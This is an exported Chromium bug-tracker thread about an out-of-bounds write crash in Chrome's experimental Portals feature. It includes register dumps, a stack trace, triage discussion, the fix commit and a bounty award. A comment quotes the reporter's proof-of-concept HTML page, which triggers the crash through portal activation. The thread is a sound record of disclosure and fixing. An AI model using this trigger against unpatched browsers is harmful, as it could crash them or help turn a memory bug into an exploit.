# Security: Out-of-bounds write browser crash

| Field | Value |
|-------|-------|
| **Issue ID** | [40052315](https://issues.chromium.org/issues/40052315) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Blink>Portals, Internals>Sandbox>SiteIsolation |
| **Platforms** | Windows |
| **Reporter** | ch...@gmail.com |
| **Assignee** | lf...@chromium.org |
| **Created** | 2020-05-15 |
| **Bounty** | $5,000.00 |

## Description

**VERSION**  

Chrome Version: 84.0.4146.4 (Official Build) canary (32-bit) (cohort: Clang-32)  

Operating System: Windows 7

**REPRODUCTION CASE**

I've got several crashes with using a PoC contains a malware URL, but I don't have specific steps to repro this crash. Still trying to figure it out. Here is a crash IDs:

Crash ID 6b46c7d741565106

eax=5d92298c ebx=0c3ba201 ecx=0c44bd18 edx=5d7f1078 esi=0eb582d8 edi=0c3d3cd0  

eip=574d6f94 esp=002fee90 ebp=002fee9c iopl=0 nv up ei pl nz na po nc  

cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202  

chrome\_57100000!ChromeMain+0x3d2164:  

574d6f94 894828 mov dword ptr [eax+28h],ecx ds:0023:5d9229b4=7600656d

## Timeline

### ct...@chromium.org (2020-05-15)

Thanks for the report. Could you provide any more details about how you triggered this crash, or any more details about what you were doing/the contents of the PoC you were handling when this happened. That will help us determine exploitability. Otherwise, let us know if you determine any more details about reproducing this crash.

Also, any more details about your browser configuration would help -- from the crash report, it looks like you maybe had the following command line flags:

  --enable-audio-service-sandbox
  --enable-experimental-web-platform-features
  --enable-features=Portals

Which could affect whether this affects "shipping" Chrome.

Looking at http://crash/6b46c7d741565106, which suspects the CL https://chromium-review.googlesource.com/c/chromium/src/+/2198057

Adding some folks from that CL in case a speculative fix is apparent.

nhiroki@ could you take a look at this crash? We don't currently have a clear repro for it, but if there is a reasonable speculative fix that would be great. (Looking at how this CL refactors code, it's also possible that this crash was triggerable before, so we may need to investigate further for root cause.)

Tentatively, this might be a critical security vulnerability (if this is really triggerable from ordinary web navigations). I'll monitor this bug and update security labels as more information comes in.

[Monorail components: Internals>Sandbox>SiteIsolation]

### ad...@google.com (2020-05-15)

[Empty comment from Monorail migration]

### ar...@chromium.org (2020-05-15)

Note that there are other reports before nhiroki@ patches:
https://crash.corp.google.com/browse?q=product_name%3D%22Chrome%22+AND+STRPOS%28expanded_custom_data.ChromeCrashProto.magic_signature_1.name%2C+%27SetOverscrollControllerEnabled%27%29+%3E+0+AND+expanded_custom_data.ChromeCrashProto.magic_signature_1.name%3D%27content%3A%3AWebContentsViewAura%3A%3ASetOverscrollControllerEnabled%27#productname:1000,productversion:220,magicsignature:100,magicsignature2:50,stablesignature:50,+url,-experiments:1000,magicsignaturesorted:50

Some "interesting URLs":
1 empty                                                                               72.73% 8             
- ----------------------------------------------------------------------------------- ------ - ------------
2 chrome-extension://knipolnnllmklapflnccelgolnpehhpl/_generated_background_page.html 9.09%  1 View webpage
3 https://testsafebrowsing.appspot.com/s/malware_in_iframe.html                       9.09%  1 View webpage
4 chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/_generated_background_page.html 9.09%  1 View webpage

### ct...@chromium.org (2020-05-15)

Thanks for looking into that Arthur. So this seems plausibly older than the CL I linked. We'll dig into this more, but starting to think about a speculative fix could be worthwhile. Looking through other reports with content::WebContentsViewAura::SetOverscrollControllerEnabled(), only two (including this one) were OOB writes (the others were segfault executions or OOB reads). The other is crash/19a8ce1a3cbe2c30 from January, although the stacktrace looks a little different and goes through some Extension code (also potentially interesting, that crash appears to be happening during browser startup). It's possible that nhiroki@'s refactor made this easier to trigger.

Per some discussion with adetaylor@, the stacktrace for this crash looks like it may be exploitable, although it would "only" allow writing the boolean out of bounds. However, even that can potentially be exploited (either overriding a security-critical boolean value somewhere, or potentially set a single bit in another value somewhere controlled by the attacker).

Given that, tentatively setting some security labels. I'll update them as more information comes in.

### [Deleted User] (2020-05-15)

Setting milestone and target because of Security_Impact=Head and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ch...@gmail.com (2020-05-15)

Thanks for the update!

I was trying to repro this with using https://lbstyle.github.io/o.html (which contains https://testsafebrowsing.appspot.com/s/malware_in_iframe.html) and opening https://testsafebrowsing.appspot.com/s/malware_in_iframe.html from another tab.

With enabled flags:

#enable-portals
#enable-experimental-web-platform-features

I will provide more information to get more details of this crash.

### ct...@chromium.org (2020-05-15)

Thanks. For reference, the page is using Portals like this:

<html>
<script>
var url = 'https://dh2048.badssl.com/';
var portal = document.createElement('portal');
function f() {
	portal.src = url;
	portal.style = "width:100%; height:100%";
	setTimeout('alert();', 1000)
	document.body.appendChild(portal);
	portal.onload = function() { portal.src = 'https://testsafebrowsing.appspot.com/s/malware_in_iframe.html'; setTimeout('portal.activate(); portal.src="x";', 200);  }
}

</script>
<body onload='f();'>
</body>
</html>

So this should not yet affect any shipping configurations of Chrome (the Origin Trial for Portals has been pushed back to M85). Updating to Impact-None for now, although we should be careful about whether this same path is triggerable without using Portals.

### ct...@chromium.org (2020-05-15)

Adding the Portal component for visibility.

[Monorail components: Blink>HTML>Portal]

### ct...@chromium.org (2020-05-15)

Hmm, the earlier crash crash/19a8ce1a3cbe2c30 does not appear to involve Portals though, so this may plausibly have multiple paths that can trigger it.

### ch...@gmail.com (2020-05-15)

Could someone please provide me the crash trace of http://crash/6b46c7d741565106? It will be useful to me.


### ct...@chromium.org (2020-05-15)

Here's the stacktrace:

0x574d6f94	(chrome.dll -web_contents_view_aura.cc:991)		content::WebContentsViewAura::SetOverscrollControllerEnabled(bool)
0x57457fa1	(chrome.dll -web_contents_impl.cc:6519)		content::WebContentsImpl::NotifySwappedFromRenderManager(content::RenderFrameHost *,content::RenderFrameHost *,bool)
0x5833baee	(chrome.dll -render_frame_host_manager.cc:2777)		content::RenderFrameHostManager::CommitPending(std::__1::unique_ptr<content::RenderFrameHostImpl,std::__1::default_delete<content::RenderFrameHostImpl> >,std::__1::unique_ptr<content::BackForwardCacheImpl::Entry,std::__1::default_delete<content::BackForwardCacheImpl::Entry> >,bool)
0x5833b93e	(chrome.dll -render_frame_host_manager.cc:457)		content::RenderFrameHostManager::CommitPendingIfNecessary(content::RenderFrameHostImpl *,bool,bool,bool)
0x5833b862	(chrome.dll -render_frame_host_manager.cc:426)		content::RenderFrameHostManager::DidNavigateFrame(content::RenderFrameHostImpl *,bool,bool,bool,blink::FramePolicy const &)
0x5831a44f	(chrome.dll -navigator.cc:239)		content::Navigator::DidNavigate(content::RenderFrameHostImpl *,FrameHostMsg_DidCommitProvisionalLoad_Params const &,std::__1::unique_ptr<content::NavigationRequest,std::__1::default_delete<content::NavigationRequest> >,bool)
0x58324c3f	(chrome.dll -render_frame_host_impl.cc:7836)		content::RenderFrameHostImpl::DidCommitNavigationInternal(std::__1::unique_ptr<content::NavigationRequest,std::__1::default_delete<content::NavigationRequest> >,std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params> >,bool)
0x583243f7	(chrome.dll -render_frame_host_impl.cc:8146)		content::RenderFrameHostImpl::DidCommitNavigation(std::__1::unique_ptr<content::NavigationRequest,std::__1::default_delete<content::NavigationRequest> >,std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params> >,mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>)
0x58325454	(chrome.dll -render_frame_host_impl.cc:2699)		content::RenderFrameHostImpl::DidCommitPerNavigationMojoInterfaceNavigation(content::NavigationRequest *,std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params> >,mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>)
0x5833aa81	(chrome.dll -bind_internal.h:497)		base::internal::FunctorTraits<void (content::RenderFrameHostImpl::*)(content::NavigationRequest *, std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params>>, mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>) __attribute__((thiscall)),void>::Invoke<void (content::RenderFrameHostImpl::*)(content::NavigationRequest *, std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params>>, mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>) __attribute__((thiscall)),content::RenderFrameHostImpl *,content::NavigationRequest *,std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params>>,mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>>
0x5833aa20	(chrome.dll -bind_internal.h:678)		base::internal::Invoker<base::internal::BindState<void (content::RenderFrameHostImpl::*)(content::NavigationRequest *, std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params>>, mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>) __attribute__((thiscall)),base::internal::UnretainedWrapper<content::RenderFrameHostImpl>,content::NavigationRequest *>,void (std::__1::unique_ptr<FrameHostMsg_DidCommitProvisionalLoad_Params,std::__1::default_delete<FrameHostMsg_DidCommitProvisionalLoad_Params>>, mojo::StructPtr<content::mojom::DidCommitProvisionalLoadInterfaceParams>)>::RunOnce
0x57e9cc44	(chrome.dll -navigation_client.mojom.cc:504)		content::mojom::NavigationClient_CommitFailedNavigation_ForwardToCallback::Accept(mojo::Message *)
0x5719c6b7	(chrome.dll -interface_endpoint_client.cc:549)		mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message *)
0x5a15839c	(chrome.dll -ipc_mojo_bootstrap.cc:934)		IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnProxyThread
0x5a1566c7	(chrome.dll -bind_internal.h:497)		base::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message) __attribute__((thiscall)),void>::Invoke<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message) __attribute__((thiscall)),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>
0x5a156686	(chrome.dll -bind_internal.h:678)		base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message) __attribute__((thiscall)),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce
0x57172555	(chrome.dll -task_annotator.cc:142)		base::TaskAnnotator::RunTask(char const *,base::PendingTask *)
0x597adea6	(chrome.dll -thread_controller_with_message_pump_impl.cc:329)		base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow *)
0x597adbf8	(chrome.dll -thread_controller_with_message_pump_impl.cc:254)		base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
0x57209025	(chrome.dll -message_pump_win.cc:227)		base::MessagePumpForUI::DoRunLoop()
0x5717a698	(chrome.dll -message_pump_win.cc:85)		base::MessagePumpWin::Run(base::MessagePump::Delegate *)
0x5716fe88	(chrome.dll -thread_controller_with_message_pump_impl.cc:443)		base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool,base::TimeDelta)
0x5716f964	(chrome.dll -run_loop.cc:124)		base::RunLoop::Run()
0x57509bb5	(chrome.dll -chrome_browser_main.cc:1676)		ChromeBrowserMainParts::MainMessageLoopRun(int *)
0x57509ad1	(chrome.dll -browser_main_loop.cc:1051)		content::BrowserMainLoop::RunMainMessageLoopParts()
0x57509a8d	(chrome.dll -browser_main_runner_impl.cc:150)		content::BrowserMainRunnerImpl::Run()
0x57193144	(chrome.dll -browser_main.cc:47)		content::BrowserMain(content::MainFunctionParams const &)
0x57192fdc	(chrome.dll -content_main_runner_impl.cc:502)		content::RunBrowserProcessMain(content::MainFunctionParams const &,content::ContentMainDelegate *)
0x57118c34	(chrome.dll -content_main_runner_impl.cc:943)		content::ContentMainRunnerImpl::RunServiceManager(content::MainFunctionParams &,bool)
0x571189f5	(chrome.dll -content_main_runner_impl.cc:845)		content::ContentMainRunnerImpl::Run(bool)
0x571188b2	(chrome.dll -content_service_manager_main_delegate.cc:52)		content::ContentServiceManagerMainDelegate::RunEmbedderProcess()
0x571081c3	(chrome.dll -main.cc:454)		service_manager::Main(service_manager::MainParams const &)
0x57107e72	(chrome.dll -content_main.cc:19)		content::ContentMain(content::ContentMainParams const &)
0x57104f11	(chrome.dll -chrome_main.cc:110)		ChromeMain
0x013323f5	(chrome.exe -main_dll_loader_win.cc:161)		MainDllLoader::Launch(HINSTANCE__ *,base::TimeTicks)
0x01331133	(chrome.exe -chrome_exe_main_win.cc:271)		wWinMain
0x01430d29	(chrome.exe -exe_common.inl:288)		__scrt_common_main_seh
0x76273c44	(kernel32.dll + 0x00053c44)		BaseThreadInitThunk
0x771537f4	(ntdll.dll + 0x000637f4)		__RtlUserThreadStart
0x771537c7	(ntdll.dll + 0x000637c7)		_RtlUserThreadStart

### lf...@chromium.org (2020-05-15)

This is a bad cast from RenderWidgetHostViewChildFrame to RenderWidgetHostViewAura.

### lf...@chromium.org (2020-05-15)

Likely portals-specific. I'll take a look.

### lf...@chromium.org (2020-05-15)

+mcnee@ since this looks similar to https://crbug.com/chromium/942194

### jo...@chromium.org (2020-05-18)

Is this still a P0 (and M-84/Target-84) if this is happening in a feature not enabled by default?

### ad...@google.com (2020-05-18)

Nope, it's not pri-0 any longer now it's been shown not to apply to default Chrome configurations. Bumping down to P1. That said, a Security_Impact-None & Security_Severity-Critical bug is a pretty unusual combination, so it's possible Sheriffbot will go rogue here and bump it back up to P0.

### jo...@chromium.org (2020-05-18)

Racing sheriffbot is like playing musical chairs with Skynet.

### ad...@google.com (2020-05-18)

Me: reduces priority to 1.
Sheriffbot: I'll be back.

### ch...@gmail.com (2020-05-25)

Still able to repro this bug on 85.0.4155.0 (Official Build) canary (64-bit) (cohort: Clang-64).

http://crash/1a4762d04f00c297
http://crash/685f8d5d056e33e5


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d29952586bbb178782a3050fa5dc128e7a3a527f

commit d29952586bbb178782a3050fa5dc128e7a3a527f
Author: Lucas Gadani <lfg@chromium.org>
Date: Tue Jun 09 21:24:00 2020

Portals: Ensure that the all views are also recreated upon activation.

A new navigation may reuse an existing RenderViewHost if there is
one being kept alive by a pending delete frame. We now re-create
the views for all RenderViewHosts upon portal activation.

Bug: 1083128
Change-Id: I8cd5df317ec783788084735e5673be22bf62de19
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2216534
Reviewed-by: Alex Moshchuk <alexmos@chromium.org>
Reviewed-by: Kevin McNee <mcnee@chromium.org>
Commit-Queue: Lucas Gadani <lfg@chromium.org>
Cr-Commit-Position: refs/heads/master@{#776703}

[modify] https://crrev.com/d29952586bbb178782a3050fa5dc128e7a3a527f/content/browser/portal/portal.cc
[modify] https://crrev.com/d29952586bbb178782a3050fa5dc128e7a3a527f/content/browser/portal/portal_browsertest.cc
[modify] https://crrev.com/d29952586bbb178782a3050fa5dc128e7a3a527f/content/browser/web_contents/web_contents_impl.cc


### lf...@chromium.org (2020-06-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-06-10)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-11)

[Empty comment from Monorail migration]

### cr...@chromium.org (2020-06-17)

Listing this as blocking for https://crbug.com/chromium/1040212, though that's mostly moot now that this has been fixed.  Just want to make sure the fix gets included in any live origin trial.

### na...@google.com (2020-06-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-06-24)

Congrats! The Panel decided to award $5,000 for this report

### na...@google.com (2020-06-24)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-06-30)

lfg@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### [Deleted User] (2020-09-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ef...@google.com (2020-10-12)

[Empty comment from Monorail migration]

[Monorail components: Blink>Portals]

### ef...@google.com (2020-10-12)

[Empty comment from Monorail migration]

[Monorail components: -Blink>HTML>Portal]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1083128?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Portals, Internals>Sandbox>SiteIsolation]
[Monorail blocking: crbug.com/chromium/1040212]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052315)*
